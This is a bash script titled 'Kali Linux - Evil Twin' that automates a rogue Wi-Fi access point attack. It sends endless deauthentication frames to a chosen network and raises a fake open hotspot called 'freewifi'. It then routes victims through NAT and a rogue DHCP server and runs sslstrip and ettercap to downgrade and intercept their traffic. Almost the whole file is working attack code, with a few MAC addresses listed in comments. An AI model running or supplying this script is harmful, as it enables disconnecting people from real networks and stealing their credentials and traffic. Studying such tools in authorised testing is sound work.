#!/bin/bash

# E8:FC:AF:9B:1F:13
# A0:63:91:65:3F:53
# 88:41:FC:D6:3C:80

# CHECK THIS LINK - FOR ASSISTANCE WITH DHCP server
#
# https://forums.kali.org/showthread.php?29442-Starting-isc-dhcp-server-fails!


#########################################
### Created by: Shlez                ####
### Kali Linux - Evil Twin           ####
#########################################
#########################################
###             Functions            ####
#########################################


# Progress bar function.
progress_bar() {
  echo -ne '#####                     (33%)\r'
  sleep 1
  echo -ne '#############             (66%)\r'
  sleep 1
  echo -ne '#######################   (100%)\r'
  sleep 0.1
  echo -ne '\n'
  echo "---------- DONE ----------"
  clear
}

# Complete task function.
sleep_mode() {
  sleep 1
  echo;echo;echo
  echo "---------- DONE ----------"
  echo;echo;echo
  sleep 2
  clear
}


#########################################
###                Main              ####
#########################################

clear


#Interface config:
in_interface="wlan1"
out_interface="wlan0"
at_interface="at0"

#Network config:
network_name="freewifi"
gateway="10.0.0.138"
dest_port="10000"

echo "Installing packages..."
apt-get install isc-dhcp-server
apt-get install sslstrip
apt-get install ettercap-text-only
progress_bar
clear

echo "Killing interfering processes..."
airmon-ng check kill
clear


echo "Setting monitor mode..."
echo
airmon-ng | grep --color=always -z "PHY	Interface	Driver		Chipset"

echo
echo "-------------------------------------------"
printf "Choose an interface: "
read in_interface

clear

echo "Starting airmon-ng on $in_interface..."
airmon-ng start $in_interface
mon_interface="$in_interface"mon

clear

xterm -geometry 80x24+1440+0 -e "airodump-ng -i $mon_interface"

clear

echo "Deauthenticating all..."

printf "BSSID:    "
read bssid
printf "Channel:  "
read channel
clear

# Changing channal of monitor mode - same as AP
sudo iwconfig $mon_interface channel $channel


# Deauthenticating the AP - broadcast
xterm -title "deauthenticating" -geometry 80x24+0+900 -e "aireplay-ng --deauth 0 -a $bssid $mon_interface" &

read
echo "Starting airbase-ng in new window..."
xterm -title "access point login" -geometry 80x24+1440+0 -e "airbase-ng -e $network_name -c 11 "$in_interface"mon" &
clear


echo "Configuring routes and tables..."
ifconfig $at_interface 192.168.2.1 netmask 255.255.255.0
ifconfig $at_interface mtu 1400
route del -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1 # if exist
route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to $gateway #
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface $at_interface -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface $out_interface -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $dest_port
progress_bar
clear


echo "DHCPD Segment:"
echo
echo "Writing etc/dhcp/dhcpd.conf..."
rm /etc/dhcp/dhcpd.conf # if exist, erase it
echo "authoritative;" > /etc/dhcp/dhcpd.conf
echo "default-lease-time 600;" >> /etc/dhcp/dhcpd.conf
echo "max-lease-time 7200;" >> /etc/dhcp/dhcpd.conf
echo "subnet 192.168.2.0 netmask 255.255.255.0 {" >> /etc/dhcp/dhcpd.conf
echo "  option routers 192.168.2.1;" >> /etc/dhcp/dhcpd.conf
echo "  option subnet-mask 255.255.255.0;" >> /etc/dhcp/dhcpd.conf
echo "  option domain-name \"$network_name\";" >> /etc/dhcp/dhcpd.conf
echo "  option domain-name-servers 192.168.2.1;" >> /etc/dhcp/dhcpd.conf
echo "  range 192.168.2.2 192.168.2.40;" >> /etc/dhcp/dhcpd.conf
echo "}" >> /etc/dhcp/dhcpd.conf
progress_bar
clear


echo "Starting DHCP server..."
dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid $at_interface
pgrep dhcpd | xargs kill -9
rm /var/run/dhcpd.pid #if exist, erase it
/etc/init.d/isc-dhcp-server start
clear

echo "Starting SSLSTRIP in new window..."
xterm -title "ssl strip logs" -geometry 80x24+1440+900 -e "sslstrip -f -p -k $dest_port" &
clear

echo "Starting ETTERCAP..."
ettercap -p -u -T -q -i $at_interface
